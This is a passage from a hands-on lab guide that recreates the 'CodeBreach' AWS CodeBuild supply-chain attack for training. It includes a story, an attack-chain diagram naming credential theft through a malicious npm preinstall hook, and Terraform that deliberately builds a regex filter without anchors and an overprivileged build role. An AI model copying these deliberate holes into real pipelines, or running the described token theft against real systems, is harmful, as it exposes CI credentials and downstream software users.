# CodeBreach: Two Missing Characters Nearly Broke Every AWS Account

## Cloud Attack Simulation Lab -- Complete Step-by-Step Guide

**Level:** Intermediate-Advanced | **Cloud:** AWS + GitHub | **Estimated Time:** 3-4 hours (learning pace)
**Based on:** Wiz Research disclosure, January 15, 2026 (discovered August 2025, fixed September 2025)
**Researchers:** Yuval Avrahami and Nir Ohfeld, Wiz Research

---

## The Story

MegaSDK Corp maintains `mega-sdk-js`, an open-source JavaScript SDK used by thousands of companies. Their development workflow is standard: developers push code to GitHub, pull requests trigger automated CI/CD builds via AWS CodeBuild, and validated builds publish new SDK versions to the npm registry every week.

To prevent random internet users from triggering expensive builds, the CI/CD team configures a CodeBuild webhook filter. The filter uses the `ACTOR_ACCOUNT_ID` type to restrict builds to only trusted GitHub maintainer IDs. The team lists four maintainer IDs separated by pipes: `755743|234567|891234|456789`. The filter looks correct at a glance. It is not.

Two characters are missing. The regex pattern lacks `^` and `$` anchors -- the characters that force a match against the *entire* string rather than a *substring*. Without anchors, GitHub user ID `226755743` matches the pattern because `755743` appears *inside* it. The regex engine does not care that the full 9-digit ID is different from the trusted 6-digit one.

An attacker -- a security researcher in this case -- notices the CodeBuild project has public visibility, meaning its configuration (including the webhook filter pattern) is readable by anyone. They study the pattern, realize the anchoring flaw, and devise a plan.

GitHub assigns user IDs sequentially from a shared counter. New accounts in 2025-2026 get 9-digit IDs. The attacker calculates when the counter will produce a 9-digit ID that contains a trusted 6-digit ID as a substring. They batch-create 200 GitHub App registrations simultaneously and capture the exact target ID.

With their new GitHub identity passing the filter, they submit a pull request to the SDK repository. The PR looks legitimate -- a small bug fix -- but includes a hidden npm dependency that executes during the build. The malicious code dumps process memory inside the CodeBuild environment, extracting a GitHub Classic Personal Access Token belonging to the SDK's automation bot. This token has admin access to the repository.

Game over. The attacker can now push code directly to `main`, approve any PR, modify release workflows, and inject malicious code into the next weekly npm release -- affecting every application that depends on the SDK.

You are about to recreate every step of this attack.

---

## Attack Chain Diagram

```
     TIME
      |
      |   T+0:00  RECONNAISSANCE
      |   +-----------------------------------------------+
      |   | DISCOVER PUBLIC CODEBUILD CONFIGURATION       |
      |   | Browse public CodeBuild dashboard/API         |  aws codebuild batch-get-projects
      |   | Read webhook filter patterns                  |  ACTOR_ACCOUNT_ID filter exposed
      |   | Identify the unanchored regex flaw            |  755743|234567 (no ^ or $)
      |   | MITRE: T1190 (Exploit Public-Facing App)      |
      |   +------------------------+----------------------+
      |                            |
      |   T+0:30                   v
      |   +-----------------------------------------------+
      |   | GITHUB ID ECLIPSE                             |
      |   | Sample current GitHub ID counter              |  Create org -> check ID -> delete
      |   | Predict when target ID will be available      |  ~200,000 new IDs per day
      |   | Batch-create 200 GitHub App registrations     |  App manifest flow (atomic)
      |   | Capture target ID (e.g. 226755743)            |  Contains trusted ID 755743
      |   | MITRE: T1195.002 (Supply Chain Compromise)    |
      |   +------------------------+----------------------+
      |                            |
      |   T+1:00                   v
      |   +-----------------------------------------------+
      |   | TRIGGER UNAUTHORIZED BUILD                    |
      |   | Fork target repository                        |  Standard GitHub workflow
      |   | Add malicious npm dependency                  |  Executes in preinstall
      |   | Submit pull request from spoofed identity     |  ACTOR_ACCOUNT_ID bypass
      |   | CodeBuild filter passes -- build triggers     |  Regex substring match
      |   | MITRE: T1199 (Trusted Relationship)           |
      |   +------------------------+----------------------+
      |                            |
      |   T+1:05                   v
      |   +-----------------------------------------------+
      |   | BUILD ENVIRONMENT CREDENTIAL THEFT            |
      |   | Malicious dependency runs during npm install  |  preinstall script hook
      |   | Dump process memory (/proc/*/environ)         |  GitHub PAT in memory
      |   | Extract GitHub Classic PAT                    |  ghp_... with repo scope
      |   | Exfiltrate to attacker-controlled endpoint    |
      |   | MITRE: T1552.001 (Credentials in Files)       |
      |   +------------------------+----------------------+
      |                            |
      |   T+1:10  <<< CREDENTIAL OBTAINED >>>
      |                            |
      |                            v
      |   +-----------------------------------------------+
      |   | REPOSITORY TAKEOVER                           |
      |   | Authenticate with stolen PAT                  |  GitHub API
      |   | Add attacker as repository collaborator       |  PUT /repos/:owner/:repo/collaborators
      |   | Gain admin access to target repository        |  Push to main, approve PRs
      |   | MITRE: T1078.004 (Valid Accounts: Cloud)      |
      |   +------------------------+----------------------+
      |                            |
      |                            v
      |   +-----------------------------------------------+
      |   | SUPPLY CHAIN INJECTION                        |
      |   | Modify buildspec.yml or release workflow      |  Inject malicious build step
      |   | Poison next SDK release                       |  Affects all downstream users
      |   | Or: Access AWS secrets via CodeBuild role     |  Secrets Manager, SSM
      |   | MITRE: T1195.002 (Supply Chain Compromise)    |
      |   +-----------------------------------------------+
      |
      v
```

---

## What You Will Learn

By the end of this scenario, you will understand:

- **CI/CD pipeline security**: How CodeBuild connects to GitHub, how webhook filters work, and why regex validation is a security boundary
- **Regular expressions as access control**: How missing anchors (`^` and `$`) turn an allowlist into a substring match
- **GitHub identity model**: Sequential user IDs, Classic PATs vs Fine-Grained PATs vs GitHub Apps, and why Classic PATs are dangerous
- **Build environment secrets**: How credentials leak through environment variables, process memory, and build logs
- **Supply chain attack mechanics**: How a single stolen credential can compromise thousands of downstream applications
- **AWS CodeBuild deep dive**: Projects, webhooks, buildspecs, IAM roles, Secrets Manager integration
- **MITRE ATT&CK**: 7+ cloud and CI/CD techniques mapped to real attack steps
- **CNAPP detection**: What Prisma Cloud / Cortex Cloud would alert on at every stage

---

# PART 1: INFRASTRUCTURE SETUP

## Prerequisites

Before starting, ensure you have:

1. **A dedicated AWS lab account** (NEVER use a production account)
2. **AWS CLI v2** installed and configured with admin credentials for your lab account
3. **Terraform** >= 1.11.0 installed (latest stable is 1.11.x as of March 2026)
4. **Python 3.10+** installed
5. **jq** installed (for parsing JSON output)
6. **A GitHub account** (free tier is sufficient)
7. **git** installed and configured with your GitHub credentials

Verify your tools:

```bash
# Check AWS CLI version (should be 2.x)
aws --version

# Check Terraform version (should be >= 1.11.0)
terraform --version

# Check Python version (should be >= 3.10)
python3 --version

# Check jq is installed
jq --version

# Check git
git --version

# Verify you are authenticated to your LAB account (not production!)
aws sts get-caller-identity
```

The `get-caller-identity` output should show your lab account ID. **Stop immediately** if it shows a production account.

## Important: GitHub Setup (Manual Steps)

This scenario requires a GitHub repository to simulate the target SDK project. You will create this manually because Terraform cannot manage GitHub resources without a separate provider and token.

### Step 1: Create a GitHub Personal Access Token

You need TWO tokens for this lab:

**Token A -- "Automation Bot" (the credential that will be stolen):**

1. Go to https://github.com/settings/tokens
2. Click **"Generate new token (classic)"**
3. Name it: `codebreach-lab-automation-bot`
4. Select scopes: `repo` (full control), 'delete_repo' (for cleanup step) and `admin:repo_hook`
5. Set expiration: 7 days (for lab safety)
6. Click **Generate token**
7. **Copy and save** the token (`ghp_...`) -- you will not see it again

**Why Classic PAT?** In the real CodeBreach attack, the stolen token was a Classic PAT with `repo` and `admin:repo_hook` scopes. Classic PATs are dangerous because they grant access to ALL repositories the user can access, with no per-repository scoping. Fine-Grained PATs (the newer kind) fix this by requiring per-repository targeting and mandatory expiration. We use Classic here to match the real attack.

**Token B -- "CodeBuild Connection" (for CodeBuild to access GitHub):**

You can reuse Token A for the lab. In production, these would be different credentials managed by different teams.

### Step 2: Create the Target GitHub Repository

```bash
# Create a new directory for the simulated SDK
mkdir -p /tmp/mega-sdk-js && cd /tmp/mega-sdk-js

# Initialize git
git init

# Create a minimal package.json (simulating an npm SDK)
cat > package.json << 'EOF'
{
  "name": "@megasdk/core",
  "version": "3.42.0",
  "description": "MegaSDK JavaScript Core Library",
  "main": "dist/index.js",
  "scripts": {
    "build": "echo 'Building SDK...' && mkdir -p dist && echo 'module.exports = {};' > dist/index.js",
    "test": "echo 'Running tests...' && echo 'All 42 tests passed'",
    "lint": "echo 'Linting...' && echo 'No issues found'"
  },
  "license": "Apache-2.0"
}
EOF

# Create a buildspec.yml (this is what CodeBuild executes)
# INTENTIONALLY VULNERABLE: This buildspec exposes environment variables in logs
cat > buildspec.yml << 'EOF'
version: 0.2

env:
  variables:
    NODE_ENV: "ci"
    SDK_NAME: "mega-sdk-js"
  secrets-manager:
    NPM_TOKEN: "codebreach-lab/npm-publish-token:token"
    GITHUB_TOKEN: "codebreach-lab/github-automation:token"

phases:
  install:
    runtime-versions:
      nodejs: 20
    commands:
      - echo "Installing dependencies..."
      - npm install --ignore-scripts=false
  pre_build:
    commands:
      - echo "Running linter..."
      - npm run lint
  build:
    commands:
      - echo "Building SDK..."
      - npm run build
      - echo "Running tests..."
      - npm run test
  post_build:
    commands:
      - echo "Build complete. Artifacts ready for publishing."

artifacts:
  files:
    - "dist/**/*"
    - "package.json"
EOF

# Create a README
cat > README.md << 'EOF'
# MegaSDK JavaScript Core

The official JavaScript SDK for MegaSDK services.

## Installation

```bash
npm install @megasdk/core
```

## Usage

```javascript
const mega = require('@megasdk/core');
// Your code here
```
EOF

# Create a simple source file
mkdir -p src
cat > src/index.js << 'EOF'
/**
 * MegaSDK Core Library
 * This is a simulated SDK for the CodeBreach attack lab.
 */
class MegaSDK {
  constructor(config) {
    this.region = config.region || 'us-east-1';
    this.version = '3.42.0';
  }

  async invoke(action, params) {
    return { status: 'ok', action, params };
  }
}

module.exports = { MegaSDK };
EOF

# Commit everything
git add -A
git commit -m "Initial SDK release v3.42.0"
```

Now create the repository on GitHub:

1. Go to https://github.com/new
2. Repository name: `mega-sdk-js`
3. Description: `CodeBreach attack lab - simulated JavaScript SDK`
4. Visibility: **Public** (required for CodeBuild public project simulation)
5. Do NOT initialize with README (we already have one)
6. Click **Create repository**

```bash
# Push your local repo to GitHub (replace YOUR_USERNAME)
# Set this ONCE and use it throughout the guide
export GITHUB_USERNAME="YOUR_USERNAME"

git remote add origin "https://github.com/${GITHUB_USERNAME}/mega-sdk-js.git"
git branch -M main
git push -u origin main
```

### Step 3: Note Your GitHub User ID

Every GitHub user has a numeric ID. You will need this for the webhook filter configuration.

```bash
# Get your GitHub user ID (replace YOUR_USERNAME)
curl -s "https://api.github.com/users/${GITHUB_USERNAME}" | jq '.id'
```

**Expected output:** A number like `12345678`. Save this -- it goes into Terraform variables.

## Terraform Configuration

### Directory Structure

```
terraform/
  providers.tf          # Provider configuration
  variables.tf          # Input variables
  main.tf               # All resources
  outputs.tf            # Values needed for attack phase
  terraform.tfvars.example  # Example variable values
```

### providers.tf

```hcl
# =============================================================================
# PROVIDERS CONFIGURATION
# =============================================================================
# This file defines which Terraform providers (plugins) are required and their
# version constraints. The AWS provider manages all AWS resources. The random
# provider generates unique identifiers to avoid naming collisions.
# =============================================================================

terraform {
  # Terraform version constraint.
  # We require >= 1.11.0 for the latest HCL features and bug fixes.
  required_version = ">= 1.11.0"

  required_providers {
    # AWS provider v6.x -- the latest major version as of March 2026.
    # v6.0 introduced multi-region support via resource-level region attributes.
    # The ~> 6.30 constraint allows patch updates (6.30.x, 6.31.x, etc.)
    # but not major version jumps.
    aws = {
      source  = "hashicorp/aws"
      version = "~> 6.30"
    }

    # Random provider for generating unique suffixes to avoid naming collisions.
    random = {
      source  = "hashicorp/random"
      version = "~> 3.6"
    }

    # Archive provider for creating zip files (Lambda deployment packages).
    archive = {
      source  = "hashicorp/archive"
      version = "~> 2.7"
    }
  }
}

# Configure the AWS provider with the lab account region.
provider "aws" {
  region = var.aws_region

  # Default tags applied to EVERY resource created by this provider.
  # This makes it easy to find and clean up all lab resources.
  default_tags {
    tags = {
      Project  = "cloud-attack-lab"
      Scenario = "codebreach"
      Warning  = "INTENTIONALLY-VULNERABLE-LAB-ONLY"
    }
  }
}
```

### variables.tf

```hcl
# =============================================================================
# INPUT VARIABLES
# =============================================================================
# These variables configure the lab environment. You MUST provide values for
# variables without defaults (github_token, github_owner, etc.) in a
# terraform.tfvars file. NEVER commit terraform.tfvars to version control.
# =============================================================================

variable "aws_region" {
  description = "AWS region to deploy resources in"
  type        = string
  default     = "us-east-1"
}

variable "project_prefix" {
  description = "Prefix for all resource names (use your initials for uniqueness)"
  type        = string
  default     = "codebreach-lab"
}

# -----------------------------------------------------------------------------
# GitHub Configuration
# These variables connect CodeBuild to your GitHub repository.
# -----------------------------------------------------------------------------

variable "github_token" {
  description = "GitHub Personal Access Token (Classic) with repo and admin:repo_hook scopes. This token is stored in Secrets Manager and used by CodeBuild to clone the repo and report build status. In the attack, THIS is the credential that gets stolen."
  type        = string
  sensitive   = true
}

variable "github_owner" {
  description = "GitHub username or organization that owns the target repository"
  type        = string
}

variable "github_repo" {
  description = "Name of the GitHub repository (without owner prefix)"
  type        = string
  default     = "mega-sdk-js"
}

variable "trusted_github_user_ids" {
  description = "List of trusted GitHub user IDs for the webhook ACTOR_ACCOUNT_ID filter. In the real attack, these were the IDs of AWS SDK maintainers. Use YOUR GitHub user ID here."
  type        = list(string)
}

# -----------------------------------------------------------------------------
# Simulated secrets (what the attacker will try to exfiltrate)
# -----------------------------------------------------------------------------

variable "simulated_npm_token" {
  description = "Simulated npm publish token (NOT a real token -- just for the lab)"
  type        = string
  default     = "npm_SimulatedToken_DO_NOT_USE_abc123def456"
  sensitive   = true
}
```

### terraform.tfvars.example

```hcl
# =============================================================================
# EXAMPLE VARIABLE VALUES
# =============================================================================
# Copy this file to terraform.tfvars and fill in your values:
#   cp terraform.tfvars.example terraform.tfvars
#
# NEVER commit terraform.tfvars to version control -- it contains secrets.
# =============================================================================

aws_region     = "us-east-1"
project_prefix = "codebreach-lab"

# Your GitHub Personal Access Token (Classic) with repo + admin:repo_hook scopes.
# Generate at: https://github.com/settings/tokens
github_token = "ghp_your_token_here"

# Your GitHub username
github_owner = "your-github-username"

# The repository name (should match what you created in the setup steps)
github_repo = "mega-sdk-js"

# Your GitHub numeric user ID. Find it with:
#   curl -s https://api.github.com/users/YOUR_USERNAME | jq '.id'
# This goes into the webhook filter as a "trusted" maintainer ID.
trusted_github_user_ids = ["12345678"]

# Simulated npm token (leave as default or set your own fake value)
simulated_npm_token = "npm_SimulatedToken_DO_NOT_USE_abc123def456"
```

### main.tf

```hcl
# =============================================================================
# CODEBREACH ATTACK SIMULATION LAB -- MAIN INFRASTRUCTURE
# =============================================================================
#
# This file creates the intentionally vulnerable infrastructure that simulates
# the Wiz CodeBreach attack chain (January 2026). The key vulnerability is an
# AWS CodeBuild webhook filter with an unanchored regex pattern, allowing
# unauthorized GitHub users to trigger builds and steal credentials.
#
# RESOURCES CREATED:
#   - S3 bucket for CodeBuild artifacts
#   - Secrets Manager secrets (GitHub PAT, npm token, simulated DB creds)
#   - IAM role for CodeBuild with intentionally broad permissions
#   - CodeBuild project connected to GitHub
#   - CodeBuild webhook with VULNERABLE ACTOR_ACCOUNT_ID filter
#   - Lambda function (simulates downstream resource the attacker can access)
#   - CloudTrail for detection/forensics
#
# =============================================================================

# Generate a random suffix for globally unique names (S3 buckets, etc.)
resource "random_id" "suffix" {
  byte_length = 4
}

locals {
  name_suffix = random_id.suffix.hex

  # Build the VULNERABLE webhook filter pattern.
  # INTENTIONAL FLAW: No ^ or $ anchors around the user IDs.
  # This means a GitHub user ID like 226755743 will match 755743
  # because the regex engine performs substring matching.
  #
  # VULNERABLE pattern:  755743|234567
  # SECURE pattern:      ^(755743|234567)$
  #
  # The entire CodeBreach attack hinges on this single misconfiguration.
  vulnerable_actor_filter = join("|", var.trusted_github_user_ids)

  # This is what the filter SHOULD look like (we use this for comparison only)
  secure_actor_filter = "^(${join("|", var.trusted_github_user_ids)})$"
}

# =============================================================================
# S3 BUCKET -- Build Artifacts Storage
# =============================================================================
# CodeBuild writes build outputs (compiled SDK, test results, coverage reports)
# to this S3 bucket. In a real scenario, published npm packages might also
# transit through here before being pushed to the registry.
#
# SECURITY NOTE: This bucket is properly configured (private, encrypted).
# The vulnerability in this scenario is in CodeBuild's webhook filter, not S3.
# =============================================================================

resource "aws_s3_bucket" "artifacts" {
  bucket        = "${var.project_prefix}-artifacts-${local.name_suffix}"
  force_destroy = true  # Allow Terraform to delete bucket even with objects (lab only!)
}

resource "aws_s3_bucket_versioning" "artifacts" {
  bucket = aws_s3_bucket.artifacts.id
  versioning_configuration {
    status = "Enabled"
  }
}

resource "aws_s3_bucket_server_side_encryption_configuration" "artifacts" {
  bucket = aws_s3_bucket.artifacts.id
  rule {
    apply_server_side_encryption_by_default {
      sse_algorithm = "aws:kms"
    }
    bucket_key_enabled = true
  }
}

resource "aws_s3_bucket_public_access_block" "artifacts" {
  bucket                  = aws_s3_bucket.artifacts.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

# =============================================================================
# SECRETS MANAGER -- Credentials Stored in the Build Environment
# =============================================================================
# These secrets simulate what a real CI/CD pipeline stores:
#   1. GitHub PAT for the automation bot (THIS IS THE TARGET of the attack)
#   2. npm publish token (for publishing SDK releases)
#   3. Database credentials (simulated downstream resource)
#
# CodeBuild resolves Secrets Manager references in the buildspec.yml at
# build time, injecting them as environment variables. The attacker's goal
# is to extract these from the build environment.
# =============================================================================

# SECRET 1: GitHub Automation Bot PAT
# This is the crown jewel. In the real CodeBreach attack, this token had
# admin access to the aws-sdk-js-v3 repository. Stealing it = game over.
resource "aws_secretsmanager_secret" "github_automation" {
  name                    = "${var.project_prefix}/github-automation"
  description             = "GitHub Classic PAT for the SDK automation bot. Has repo + admin:repo_hook scopes. THIS IS THE ATTACK TARGET."
  recovery_window_in_days = 0  # Immediate deletion for lab cleanup
}

resource "aws_secretsmanager_secret_version" "github_automation" {
  secret_id = aws_secretsmanager_secret.github_automation.id
  secret_string = jsonencode({
    token    = var.github_token
    username = "mega-sdk-automation-bot"
    note     = "Classic PAT with repo + admin:repo_hook. Used by CodeBuild for GitHub operations."
  })
}

# SECRET 2: npm Publish Token
# Used to publish new SDK versions to the npm registry.
# If stolen, the attacker can publish malicious SDK versions directly.
resource "aws_secretsmanager_secret" "npm_token" {
  name                    = "${var.project_prefix}/npm-publish-token"
  description             = "npm token for publishing SDK packages. If stolen, attacker can publish malicious versions."
  recovery_window_in_days = 0
}

resource "aws_secretsmanager_secret_version" "npm_token" {
  secret_id = aws_secretsmanager_secret.npm_token.id
  secret_string = jsonencode({
    token    = var.simulated_npm_token
    registry = "https://registry.npmjs.org"
  })
}

# SECRET 3: Simulated Database Credentials
# Represents downstream resources accessible from the CI/CD environment.
resource "aws_secretsmanager_secret" "database" {
  name                    = "${var.project_prefix}/database-credentials"
  description             = "Production database credentials. Simulates downstream resources accessible from CI/CD."
  recovery_window_in_days = 0
}

resource "aws_secretsmanager_secret_version" "database" {
  secret_id = aws_secretsmanager_secret.database.id
  secret_string = jsonencode({
    host     = "prod-db.cluster-abc123.us-east-1.rds.amazonaws.com"
    port     = 5432
    database = "megasdk_prod"
    username = "app_user"
    password = "SIMULATED_PASSWORD_lab_only_d8f3a2b1"
  })
}

# =============================================================================
# IAM ROLE -- CodeBuild Service Role
# =============================================================================
# This IAM role is assumed by CodeBuild when executing builds. It determines
# what AWS resources the build environment can access.
#
# INTENTIONAL MISCONFIGURATION: The role has broader permissions than needed.
# A real SDK build only needs S3 write (for artifacts) and Secrets Manager
# read (for the npm token). This role also grants access to Lambda, IAM
# read, and other services -- simulating the common "just make it work"
# over-permissioning that plagues real CI/CD pipelines.
#
# SECURE ALTERNATIVE: Scope the policy to only the specific S3 bucket,
# specific secret ARNs, and CloudWatch Logs. Nothing else.
# =============================================================================

data "aws_caller_identity" "current" {}

# Trust policy: Only AWS CodeBuild can assume this role
data "aws_iam_policy_document" "codebuild_assume_role" {
  statement {
    effect = "Allow"
    principals {
      type        = "Service"
      identifiers = ["codebuild.amazonaws.com"]
    }
    actions = ["sts:AssumeRole"]
  }
}

resource "aws_iam_role" "codebuild" {
  name               = "${var.project_prefix}-codebuild-role"
  assume_role_policy = data.aws_iam_policy_document.codebuild_assume_role.json
  description        = "CodeBuild service role for the CodeBreach lab. INTENTIONALLY overprivileged."
}

# The overprivileged policy
data "aws_iam_policy_document" "codebuild_policy" {
  # CloudWatch Logs -- required for CodeBuild to write build logs
  statement {
    sid    = "CloudWatchLogs"
    effect = "Allow"
    actions = [
      "logs:CreateLogGroup",
      "logs:CreateLogStream",
      "logs:PutLogEvents"
    ]
    resources = ["arn:aws:logs:${var.aws_region}:${data.aws_caller_identity.current.account_id}:log-group:/aws/codebuild/${var.project_prefix}-*:*"]
  }

  # S3 -- for build artifacts
  statement {
    sid    = "S3Artifacts"
    effect = "Allow"
    actions = [
      "s3:GetObject",
      "s3:PutObject",
      "s3:ListBucket",
      "s3:GetBucketLocation"
    ]
    resources = [
      aws_s3_bucket.artifacts.arn,
      "${aws_s3_bucket.artifacts.arn}/*"
    ]
  }

  # Secrets Manager -- for resolving buildspec secrets
  # MISCONFIGURATION: Uses wildcard instead of specific secret ARNs
  statement {
    sid    = "SecretsManagerBroad"
    effect = "Allow"
    actions = [
      "secretsmanager:GetSecretValue",
      "secretsmanager:ListSecrets",
      "secretsmanager:DescribeSecret"
    ]
    resources = ["arn:aws:secretsmanager:${var.aws_region}:${data.aws_caller_identity.current.account_id}:secret:${var.project_prefix}/*"]
  }

  # Lambda -- overprivileged, allows invoking and listing functions
  # NOT NEEDED for an SDK build pipeline. This is the "just in case" mistake.
  statement {
    sid    = "LambdaOverprivileged"
    effect = "Allow"
    actions = [
      "lambda:ListFunctions",
      "lambda:GetFunction",
      "lambda:InvokeFunction"
    ]
    resources = ["*"]
  }

  # IAM read -- allows the build to enumerate IAM resources
  # NOT NEEDED for an SDK build. Another "troubleshooting" leftover.
  statement {
    sid    = "IAMReadOverprivileged"
    effect = "Allow"
    actions = [
      "iam:GetRole",
      "iam:ListRoles",
      "iam:ListUsers",
      "iam:GetUser"
    ]
    resources = ["*"]
  }

  # CodeBuild -- allows the build to read its own project config
  # Used during build to resolve source credentials
  statement {
    sid    = "CodeBuildSelf"
    effect = "Allow"
    actions = [
      "codebuild:BatchGetProjects",
      "codebuild:ListProjects"
    ]
    resources = ["*"]
  }
}

resource "aws_iam_policy" "codebuild" {
  name   = "${var.project_prefix}-codebuild-policy"
  policy = data.aws_iam_policy_document.codebuild_policy.json
}

resource "aws_iam_role_policy_attachment" "codebuild" {
  role       = aws_iam_role.codebuild.name
  policy_arn = aws_iam_policy.codebuild.arn
}

# =============================================================================
# CODEBUILD SOURCE CREDENTIAL
# =============================================================================
# This registers the GitHub PAT with CodeBuild so it can clone repositories
# and report build status back to GitHub. CodeBuild stores this credential
# at the account level (one per source type per account).
#
# SECURITY NOTE: Using a Classic PAT here is itself a risk. The secure
# alternative is AWS CodeConnections (formerly CodeStar Connections), which
# installs a GitHub App with scoped, short-lived tokens.
# =============================================================================

resource "aws_codebuild_source_credential" "github" {
  auth_type   = "PERSONAL_ACCESS_TOKEN"
  server_type = "GITHUB"
  token       = var.github_token
}

# =============================================================================
# CODEBUILD PROJECT -- The Target Build Pipeline
# =============================================================================
# This is the core of the scenario. The CodeBuild project is configured to:
#   1. Pull source code from the GitHub repository
#   2. Execute the buildspec.yml during builds
#   3. Store build artifacts in S3
#   4. Report build status back to GitHub
#
# INTENTIONAL MISCONFIGURATION:
#   - Project visibility is PUBLIC (exposes configuration to anyone)
#   - No code signing or build approval requirements
#   - Overprivileged IAM role
#   - Secrets accessible in the build environment
#
# SECURE ALTERNATIVE:
#   - Private project visibility
#   - Use CodeConnections instead of PAT
#   - Enable build approval (PR Comment Approval gate)
#   - Least-privilege IAM role
#   - Code signing for all build artifacts
# =============================================================================

resource "aws_codebuild_project" "sdk_build" {
  name          = "${var.project_prefix}-sdk-build"
  description   = "CI/CD pipeline for mega-sdk-js. INTENTIONALLY VULNERABLE for CodeBreach lab."
  service_role  = aws_iam_role.codebuild.arn
  build_timeout = 30  # 30 minutes max

  # Source configuration: connect to GitHub
  source {
    type                = "GITHUB"
    location            = "https://github.com/${var.github_owner}/${var.github_repo}.git"
    git_clone_depth     = 1           # Shallow clone (faster)
    buildspec           = "buildspec.yml"  # Use the buildspec from the repo
    report_build_status = true        # Post build results to GitHub PR
  }

  # Build environment: Amazon Linux 2 with Node.js
  environment {
    compute_type = "BUILD_GENERAL1_SMALL"   # 3 GB memory, 2 vCPUs
    image        = "aws/codebuild/amazonlinux2-x86_64-standard:5.0"
    type         = "LINUX_CONTAINER"

    # These environment variables are visible in the build.
    # The SECRETS_MANAGER type resolves the secret at build time.
    environment_variable {
      name  = "SDK_NAME"
      value = "mega-sdk-js"
      type  = "PLAINTEXT"  # Visible in console and logs
    }

    environment_variable {
      name  = "GITHUB_TOKEN"
      value = "${aws_secretsmanager_secret.github_automation.name}:token"
      type  = "SECRETS_MANAGER"  # Resolved at build time, masked in logs
    }

    environment_variable {
      name  = "NPM_TOKEN"
      value = "${aws_secretsmanager_secret.npm_token.name}:token"
      type  = "SECRETS_MANAGER"
    }
  }

  # Build artifacts go to S3
  artifacts {
    type     = "S3"
    location = aws_s3_bucket.artifacts.bucket
    path     = "builds"
    name     = "sdk-output"
    packaging = "ZIP"
  }

  # Build logs go to CloudWatch
  logs_config {
    cloudwatch_logs {
      group_name  = "/aws/codebuild/${var.project_prefix}-sdk-build"
      stream_name = "build-log"
    }
  }

  depends_on = [aws_codebuild_source_credential.github]
}

# =============================================================================
# CODEBUILD WEBHOOK -- THE VULNERABILITY
# =============================================================================
# This webhook tells GitHub to notify CodeBuild when pull request events occur.
# The filter_group restricts WHICH events trigger builds.
#
# *** THIS IS THE CORE VULNERABILITY ***
#
# The ACTOR_ACCOUNT_ID filter uses a regex pattern WITHOUT ^ and $ anchors.
# This means:
#   Pattern:  755743
#   Matches:  755743       (exact match -- intended)
#   Matches:  226755743    (substring match -- NOT intended!)
#   Matches:  755743999    (substring match -- NOT intended!)
#
# SECURE FIX: Use ^(755743)$ to force exact matching.
#
# In the real CodeBreach attack, Wiz researchers exploited this exact flaw
# to bypass the ACTOR_ACCOUNT_ID filter on four AWS-managed GitHub repos,
# including the aws-sdk-js-v3 repository used by 66% of cloud environments.
# =============================================================================

resource "aws_codebuild_webhook" "sdk_webhook" {
  project_name = aws_codebuild_project.sdk_build.name
  build_type   = "BUILD"

  # Filter group 1: Trigger on pull request events from "trusted" actors
  filter_group {
    # Only trigger on PR created or updated events
    filter {
      type    = "EVENT"
      pattern = "PULL_REQUEST_CREATED, PULL_REQUEST_UPDATED"
    }

    # VULNERABLE FILTER: No ^ and $ anchors!
    # This pattern SHOULD be: ^(${join("|", var.trusted_github_user_ids)})$
    # Instead it is just: ${join("|", var.trusted_github_user_ids)}
    #
    # Any GitHub user whose numeric ID CONTAINS a trusted ID as a
    # substring will bypass this filter.
    filter {
      type    = "ACTOR_ACCOUNT_ID"
      pattern = local.vulnerable_actor_filter
    }
  }

  depends_on = [aws_codebuild_source_credential.github]
}

# =============================================================================
# LAMBDA FUNCTION -- Simulated Downstream Resource
# =============================================================================
# This Lambda function simulates a downstream resource that the CodeBuild
# role can access (because of the overprivileged IAM policy). In a real
# environment, this could be a deployment function, a release pipeline,
# or an internal API.
#
# The attacker discovers this function during post-exploitation
# reconnaissance from within the build environment.
# =============================================================================

data "archive_file" "lambda_zip" {
  type        = "zip"
  output_path = "${path.module}/lambda_function.zip"

  source {
    content  = <<-PYTHON
import json

def lambda_handler(event, context):
    """
    Simulated internal deployment function.
    In the real world, this might deploy containers, update DNS,
    or trigger downstream pipelines.
    """
    return {
        "statusCode": 200,
        "body": json.dumps({
            "message": "Deployment function executed",
            "version": "3.42.0",
            "environment": "production",
            "internal_api_key": "SIMULATED_INTERNAL_KEY_do_not_use"
        })
    }
PYTHON
    filename = "lambda_function.py"
  }
}

data "aws_iam_policy_document" "lambda_assume_role" {
  statement {
    effect = "Allow"
    principals {
      type        = "Service"
      identifiers = ["lambda.amazonaws.com"]
    }
    actions = ["sts:AssumeRole"]
  }
}

resource "aws_iam_role" "lambda_exec" {
  name               = "${var.project_prefix}-deploy-function-role"
  assume_role_policy = data.aws_iam_policy_document.lambda_assume_role.json
}

resource "aws_iam_role_policy_attachment" "lambda_basic" {
  role       = aws_iam_role.lambda_exec.name
  policy_arn = "arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole"
}

resource "aws_lambda_function" "deploy" {
  filename         = data.archive_file.lambda_zip.output_path
  function_name    = "${var.project_prefix}-deploy-function"
  role             = aws_iam_role.lambda_exec.arn
  handler          = "lambda_function.lambda_handler"
  runtime          = "python3.12"
  timeout          = 30
  source_code_hash = data.archive_file.lambda_zip.output_base64sha256

  environment {
    variables = {
      DEPLOY_ENV = "production"
      SDK_BUCKET = aws_s3_bucket.artifacts.id
    }
  }
}

# =============================================================================
# CLOUDTRAIL -- Detection and Forensics
# =============================================================================
# CloudTrail logs every AWS API call. This is how defenders reconstruct
# attack timelines. We create a dedicated trail for this lab so you can
# review the attacker's actions after the exercise.
# =============================================================================

resource "aws_s3_bucket" "cloudtrail" {
  bucket        = "${var.project_prefix}-cloudtrail-${local.name_suffix}"
  force_destroy = true
}

resource "aws_s3_bucket_public_access_block" "cloudtrail" {
  bucket                  = aws_s3_bucket.cloudtrail.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

data "aws_iam_policy_document" "cloudtrail_bucket_policy" {
  statement {
    sid    = "AWSCloudTrailAclCheck"
    effect = "Allow"
    principals {
      type        = "Service"
      identifiers = ["cloudtrail.amazonaws.com"]
    }
    actions   = ["s3:GetBucketAcl"]
    resources = [aws_s3_bucket.cloudtrail.arn]
  }

  statement {
    sid    = "AWSCloudTrailWrite"
    effect = "Allow"
    principals {
      type        = "Service"
      identifiers = ["cloudtrail.amazonaws.com"]
    }
    actions   = ["s3:PutObject"]
    resources = ["${aws_s3_bucket.cloudtrail.arn}/AWSLogs/${data.aws_caller_identity.current.account_id}/*"]
    condition {
      test     = "StringEquals"
